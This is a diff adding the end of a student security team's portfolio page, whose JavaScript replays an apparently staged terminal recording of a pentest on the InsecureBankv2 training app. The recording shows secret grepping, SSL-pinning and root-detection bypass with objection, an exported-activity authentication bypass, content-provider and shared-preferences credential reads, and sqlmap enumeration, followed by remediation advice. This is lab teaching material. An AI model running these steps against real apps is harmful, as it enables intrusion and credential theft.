+        <input class="field" type="text" placeholder="Your name" required>
+        <input class="field" type="email" placeholder="Email address" required>
+        <input class="field" type="text" placeholder="What do you need?" required>
+        <textarea class="field" rows="5" placeholder="Tell us about the project..." required></textarea>
+        <button class="btn" type="submit"><i class="fas fa-paper-plane"></i> Send Message</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container foot">
+    <span>© 2026 Team GILBERT-SOCIETY (G-SOCIETY)— FIRST YEAR STUDENTS, Computer Science, University of Eldoret.</span>
+    <span class="mono">Built by <i>Gilbert, A.K.A - Playboy</i> · ETHICAL HACKERS -- secured by default</span>
+  </div>
+</footer>
+
+<script>
+/* =========================================================
+   1. UI: scroll progress, mobile nav, reveal, counters
+   ========================================================= */
+var progressBar = document.getElementById('progress');
+window.addEventListener('scroll', function () {
+  var h = document.documentElement;
+  var pct = h.scrollTop / (h.scrollHeight - h.clientHeight) * 100;
+  progressBar.style.width = (pct || 0) + '%';
+});
+document.getElementById('burger').addEventListener('click', function () {
+  document.getElementById('navLinks').classList.toggle('open');
+});
+Array.prototype.forEach.call(document.querySelectorAll('.nav-links a'), function (a) {
+  a.addEventListener('click', function () {
+    document.getElementById('navLinks').classList.remove('open');
+  });
+});
+
+if ('IntersectionObserver' in window) {
+  var revealObs = new IntersectionObserver(function (entries) {
+    entries.forEach(function (e) {
+      if (e.isIntersecting) { e.target.classList.add('in'); revealObs.unobserve(e.target); }
+    });
+  }, { threshold: 0.12 });
+  Array.prototype.forEach.call(document.querySelectorAll('.reveal'), function (el) { revealObs.observe(el); });
+
+  var countObs = new IntersectionObserver(function (entries) {
+    entries.forEach(function (e) {
+      if (!e.isIntersecting) return;
+      var el = e.target, end = parseInt(el.dataset.count, 10), n = 0;
+      var step = Math.max(1, Math.round(end / 40));
+      var timer = setInterval(function () {
+        n += step;
+        if (n >= end) { n = end; clearInterval(timer); }
+        el.textContent = n + (end > 20 ? '+' : '');
+      }, 28);
+      countObs.unobserve(el);
+    });
+  }, { threshold: 0.5 });
+  Array.prototype.forEach.call(document.querySelectorAll('[data-count]'), function (el) { countObs.observe(el); });
+} else {
+  Array.prototype.forEach.call(document.querySelectorAll('.reveal'), function (el) { el.classList.add('in'); });
+}
+
+/* =========================================================
+   2. RECORDED SESSION — asciinema cast v2 data
+   Format: [timestamp_seconds, raw_text_with_ANSI]
+   ========================================================= */
+var E = '\u001b[';
+var R = E + '0m', B = E + '1m', G = E + '32m', Y = E + '33m',
+    RD = E + '31m', C = E + '36m', D = E + '90m', W = E + '97m';
+var P0 = C + 'root@kali' + R + ':' + G + '~/targets/insecurebankv2' + R + '# ';
+var CP = C + 'com.android.insecurebankv2 on (emulator-5554:5554) [usb] #' + R + ' ';
+function pr(cmd) { return P0 + B + cmd + R + '\r\n'; }
+
+var CAST = [
+  /* ---- session banner ---- */
+  [0.3, W + 'Kali GNU/Linux Rolling 2025.2' + R + ' · kernel 6.8.11-amd64 · zsh\r\n'],
+  [0.6, D + '───────────────────────────────────────────────────────────' + R + '\r\n'],
+  [0.9, G + '[REC]' + R + ' capture started 2026-11-18 14:22 EAT\r\n'],
+  [1.2, G + '[REC]' + R + ' target  : com.android.insecurebankv2 (InsecureBankv2.apk)\r\n'],
+  [1.5, G + '[REC]' + R + ' device  : emulator-5554 · Android 11 · x86_64\r\n'],
+  [1.8, D + '[REC]' + R + ' scope   : read-only testing · no data exfiltration\r\n'],
+  [2.0, pr('adb devices -l')],
+
+  /* ---- reconnaissance ---- */
+  [2.6, 'List of devices attached\r\n'],
+  [2.9, 'emulator-5554\t' + G + 'device' + R + ' product:sdk_gphone64_x86_64 model:sdk_gphone64_x86_64 transport_id:1\r\n'],
+  [3.8, pr('adb shell pm list packages | grep -iE "bank|target"')],
+  [4.4, 'package:com.android.insecurebankv2\r\n'],
+  [4.6, 'package:com.android.insecurebankv2.provider\r\n'],
+  [5.4, pr('adb shell dumpsys package com.android.insecurebankv2 | grep -E "versionName|targetSdk|debuggable"')],
+  [6.1, '    versionName=1.0\r\n'],
+  [6.3, '    targetSdk=25\r\n'],
+  [6.5, Y + '    flags=[ DEBUGGABLE HAS_CODE ALLOW_CLEARTEXT_TRAFFIC ]' + R + '\r\n'],
+  [7.4, pr('nmap -sV -p 8080 192.168.1.42')],
+  [8.7, 'PORT     STATE SERVICE VERSION\r\n'],
+  [8.9, G + '8080/tcp open  http' + R + '    Apache Tomcat/Coyote JSP engine 1.1\r\n'],
+  [9.7, '\r\n'],
+  [9.9, G + '[+]' + R + ' attack surface: 2 exported components · debuggable build · cleartext backend\r\n'],
+  [10.9, '\r\n'],
+
+  /* ---- static analysis ---- */
+  [12.0, pr('apktool d InsecureBankv2.apk -o decoded')],
+  [12.7, 'I: Using Apktool 2.9.3 on InsecureBankv2.apk\r\n'],
+  [12.9, 'I: Decoding AndroidManifest.xml with resources...\r\n'],
+  [13.1, 'I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk\r\n'],
+  [13.3, 'I: Baksmaling classes.dex...\r\n'],
+  [13.5, 'I: Copying assets and libs...\r\n'],
+  [13.8, G + 'I: Wrote decoded/ to /home/kali/targets' + R + '\r\n'],
+  [14.6, pr('grep -rniE "(password|api_key|secret|token)" decoded/res/values/strings.xml')],
+  [15.4, '12:  <string name="uname">dinesh</string>\r\n'],
+  [15.6, '13:  ' + RD + '<string name="password">Dinesh@123$</string>' + R + '\r\n'],
+  [15.8, '14:  ' + RD + '<string name="api_key">AIzaSyD_k3y_h4rdc0d3d_1n_apk</string>' + R + '\r\n'],
+  [16.8, pr("grep -n 'android:exported' decoded/AndroidManifest.xml")],
+  [17.5, '41: <activity android:name=".PostLogin" ' + Y + 'android:exported="true"' + R + '>\r\n'],
+  [17.8, '44: <provider android:name=".MyContentProvider" ' + Y + 'android:exported="true"' + R + ' android:authorities="com.android.insecurebankv2.MyContentProvider">\r\n'],
+  [18.8, Y + '[!]' + R + ' 2 hardcoded credentials and 2 exported components identified\r\n'],
+  [19.8, '\r\n'],
+
+  /* ---- dynamic instrumentation ---- */
+  [21.0, pr('frida-ps -U | grep -i bank')],
+  [21.6, ' 1234  com.android.insecurebankv2\r\n'],
+  [22.3, pr('objection -g com.android.insecurebankv2 explore')],
+  [23.0, 'Using USB device `sdk_gphone64_x86_64`\r\n'],
+  [23.3, 'Agent injected into target and listening...\r\n'],
+  [23.6, 'Running Android hooks. The hooks are in place.\r\n'],
+  [23.9, C + 'com.android.insecurebankv2 on (emulator-5554:5554) [usb] #' + R + '\r\n'],
+  [24.6, CP + 'android root disable\r\n'],
+  [25.3, G + '(agent) Root detection disabled!' + R + '\r\n'],
+  [26.1, CP + 'android sslpinning disable\r\n'],
+  [26.9, D + '(agent) Searching for implementations of TrustManager...' + R + '\r\n'],
+  [27.3, G + '(agent) Successfully patched TrustManager (OkHttp + X509TrustManager)' + R + '\r\n'],
+  [27.7, G + '(agent) SSL pinning bypassed — traffic now interceptable' + R + '\r\n'],
+  [28.5, CP + 'env\r\n'],
+  [29.2, '{ "platform": "android", "os_version": "11", "arch": "x64", "rooted": ' + G + 'true' + R + ', "frida": "16.2.1" }\r\n'],
+  [30.2, '\r\n'],
+
+  /* ---- exploitation ---- */
+  [31.5, pr('adb shell am start -n com.android.insecurebankv2/.PostLogin -e username dinesh -e password dinesh')],
+  [32.4, 'Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin (has extras) }\r\n'],
+  [32.7, G + '[+]' + R + ' PostLogin launched with attacker-controlled extras\r\n'],
+  [33.0, RD + '[!] authenticated session reached WITHOUT valid credentials (exported activity)' + R + '\r\n'],
+  [34.0, pr('adb shell content query --uri content://com.android.insecurebankv2.MyContentProvider')],
+  [34.8, G + 'Row: 0' + R + ' name=dinesh, account=1234567890, ' + RD + 'password=Dinesh@123$' + R + '\r\n'],
+  [35.9, pr('adb shell run-as com.android.insecurebankv2 cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml')],
+  [36.8, "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\r\n"],
+  [37.0, '<map>\r\n'],
+  [37.2, '    <string name="superSecret">' + RD + 'Dinesh@123$' + R + '</string>\r\n'],
+  [37.4, '    <string name="user">dinesh</string>\r\n'],
+  [37.6, '</map>\r\n'],
+  [38.5, '\r\n'],
+  [38.7, G + '[+]' + R + ' credentials recovered in cleartext from world-readable storage\r\n'],
+  [39.7, '\r\n'],
+
+  /* ---- traffic + SQL injection ---- */
+  [40.6, pr('mitmproxy -p 8080 --mode transparent')],
+  [41.6, '[14:24:01] client connect com.android.insecurebankv2\r\n'],
+  [41.9, 'POST ' + C + 'https://192.168.1.42:8080/login' + R + '\r\n'],
+  [42.2, '{"username":"dinesh","password":"' + RD + 'Dinesh@123$' + R + '"}\r\n'],
+  [42.5, Y + '[!] cleartext credentials in transit — AllowCleartextTraffic=true' + R + '\r\n'],
+  [43.4, pr('sqlmap -r request.txt -p username --dbs --batch')],
+  [44.4, '[INFO] testing connection to the target URL\r\n'],
+  [44.7, "[INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12' injectable\r\n"],
+  [45.0, '[INFO] fetching database names\r\n'],
+  [45.3, 'available databases [3]:\r\n'],
+  [45.5, '[*] information_schema\r\n'],
+  [45.7, '[*] ' + RD + 'bank_db' + R + '\r\n'],
+  [45.9, '[*] mysql\r\n'],
+  [46.8, pr('sqlmap -r request.txt -p username -D bank_db --tables --batch')],
+  [47.6, 'Database: bank_db\r\n'],
+  [47.8, '[3 tables]\r\n'],
+  [48.0, '+--------------+\r\n'],
+  [48.1, '| users        |\r\n'],
+  [48.2, '| ' + RD + 'transactions' + R + ' |\r\n'],
+  [48.3, '| accounts     |\r\n'],
+  [48.4, '+--------------+\r\n'],
+  [49.4, '\r\n'],
+
+  /* ---- report ---- */
+  [50.6, pr('findings --format table')],
+  [51.4, D + 'ID    SEVERITY  FINDING                                       MASVS' + R + '\r\n'],
+  [51.6, RD + 'F-01  CRITICAL' + R + '  Hardcoded credentials in strings.xml          MSTG-CRYPTO-1\r\n'],
+  [51.8, RD + 'F-02  CRITICAL' + R + '  Exported activity permits auth bypass         MSTG-PLATFORM-1\r\n'],
+  [52.0, Y + 'F-03  HIGH    ' + R + '  Credentials stored in cleartext SharedPrefs   MSTG-STORAGE-1\r\n'],
+  [52.2, Y + 'F-04  HIGH    ' + R + '  SQL injection in backend login endpoint       MSTG-NETWORK-1\r\n'],
+  [52.4, Y + 'F-05  MEDIUM  ' + R + '  SSL pinning not enforced / bypassable         MSTG-NETWORK-3\r\n'],
+  [52.6, D + 'F-06  LOW     ' + R + '  Debuggable flag enabled in release build      MSTG-RESILIENCE-2\r\n'],
+  [53.6, pr('report --export report.pdf')],
+  [54.4, G + '[+]' + R + ' 6 findings · 2 critical · 3 high/medium · report.pdf written\r\n'],
+  [54.7, G + '[+]' + R + ' remediation: strip secrets from APK, set exported="false", encrypt storage,\r\n'],
+  [54.9, '     parameterise queries, enforce certificate pinning\r\n'],
+  [55.6, G + '[*]' + R + ' engagement complete — handover to UoE CS Department\r\n'],
+  [56.6, '\r\n'],
+  [57.0, P0]
+];
+
+/* ---------- minimal ANSI SGR -> HTML renderer ---------- */
+var COLORS = {
+  30: '#0b1410', 31: '#ff5f56', 32: '#00ff9d', 33: '#ffc857', 34: '#2de2e6',
+  35: '#c08cff', 36: '#2de2e6', 37: '#dcf3e8', 90: '#5f7d70', 91: '#ff7b72',
+  92: '#5effc0', 93: '#ffd87f', 94: '#79e6ff', 95: '#d2a8ff', 96: '#7ff2f5', 97: '#ffffff'
+};
+function escapeHtml(s) {
+  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+function toHtml(src) {
+  src = String(src).replace(/\r\n/g, '\n').replace(/\r/g, '\n');
+  var out = '', color = null, bold = false, i = 0;
+  var re = /\u001b\[([0-9;]*)m/g;
+  function wrap(txt) {
+    if (!txt) return '';
+    var st = '';
+    if (color) st += 'color:' + color + ';';
+    if (bold) st += 'font-weight:700;';
+    return st ? '<span style="' + st + '">' + escapeHtml(txt) + '</span>' : escapeHtml(txt);
+  }
+  var match;
+  while ((match = re.exec(src)) !== null) {
+    out += wrap(src.slice(i, match.index));
+    var codes = (match[1] || '0').split(';');
+    for (var k = 0; k < codes.length; k++) {
+      var c = codes[k];
+      if (c === '' || c === '0') { color = null; bold = false; }
+      else if (c === '1') bold = true;
+      else if (c === '2') color = '#5f7d70';
+      else if (COLORS[c]) color = COLORS[c];
+    }
+    i = match.index + match[0].length;
+  }
+  out += wrap(src.slice(i));
+  return out.replace(/\u001b\[[0-9;?]*[a-zA-Z]/g, '');
+}
+
+/* ---------- playback engine ---------- */
+var termEl    = document.getElementById('term');
+var playBtn   = document.getElementById('playBtn');
+var restartB  = document.getElementById('restartBtn');
+var speedSel  = document.getElementById('speedSel');
+var tbarFill  = document.getElementById('tbarFill');
+var ttimeEl   = document.getElementById('ttime');
+var recBadge  = document.getElementById('recBadge');
+var chapters  = Array.prototype.slice.call(document.querySelectorAll('.chapter'));
+
+var END = CAST[CAST.length - 1][0];
+var buffer = '', shown = 0, t = 0, playing = false, rafId = null, lastTs = 0, speed = 2;
+
+function mmss(s) {
+  var m = Math.floor(s / 60), r = Math.floor(s % 60);
+  return (m < 10 ? '0' : '') + m + ':' + (r < 10 ? '0' : '') + r;
+}
+
+function feed(target) {
+  var changed = false;
+  while (shown < CAST.length && CAST[shown][0] <= target) {
+    buffer += CAST[shown][1];
+    shown++;
+    changed = true;
+  }
+  if (changed) {
+    termEl.innerHTML = toHtml(buffer);
+    termEl.scrollTop = termEl.scrollHeight;
+  }
+  tbarFill.style.width = (target / END * 100) + '%';
+  ttimeEl.textContent = mmss(target) + ' / ' + mmss(END);
+  var active = null;
+  for (var i = 0; i < chapters.length; i++) {
+    if (parseFloat(chapters[i].dataset.t) <= target) active = chapters[i];
+  }
+  chapters.forEach(function (c) { c.classList.toggle('active', c === active); });
+}
+
+function loop(now) {
+  if (!playing) return;
+  var dt = Math.min((now - lastTs) / 1000, 0.4) * speed;
+  lastTs = now;
+  t = Math.min(t + dt, END);
+  feed(t);
+  if (t >= END) { playing = false; updateBtn(); return; }
+  rafId = requestAnimationFrame(loop);
+}
+
+function updateBtn() {
+  playBtn.innerHTML = playing
+    ? '<i class="fas fa-pause"></i>'
+    : '<i class="fas fa-play"></i>';
+  recBadge.innerHTML = playing
+    ? '<i class="fas fa-circle"></i> REC'
+    : '<i class="fas fa-circle" style="animation:none;opacity:.4"></i> PAUSED';
+}
+
+function play() {
+  if (playing) return;
+  if (t >= END) seek(0);
+  playing = true;
+  lastTs = performance.now();
+  rafId = requestAnimationFrame(loop);
+  updateBtn();
+}
+
+function pause() {
+  playing = false;
+  if (rafId) cancelAnimationFrame(rafId);
+  updateBtn();
+}
+
+function seek(x) {
+  t = Math.max(0, Math.min(x, END));
+  buffer = ''; shown = 0;
+  feed(t);
+}
+
+playBtn.addEventListener('click', function () { playing ? pause() : play(); });
+restartB.addEventListener('click', function () { pause(); seek(0); play(); });
+speedSel.addEventListener('change', function () { speed = parseFloat(speedSel.value); });
+chapters.forEach(function (c) {
+  c.addEventListener('click', function () {
+    pause();
+    seek(parseFloat(c.dataset.t));
+    play();
+  });
+});
+termEl.addEventListener('click', function () { playing ? pause() : play(); });
+
+/* show the session header immediately, then autoplay when scrolled into view */
+seek(1.9);
+updateBtn();
+
+var started = false;
+if ('IntersectionObserver' in window) {
+  new IntersectionObserver(function (entries, obs) {
+    entries.forEach(function (e) {
+      if (e.isIntersecting && !started) { started = true; play(); obs.disconnect(); }
+    });
+  }, { threshold: 0.35 }).observe(document.querySelector('.terminal'));
+}
+</script>
+</body>
+</html>
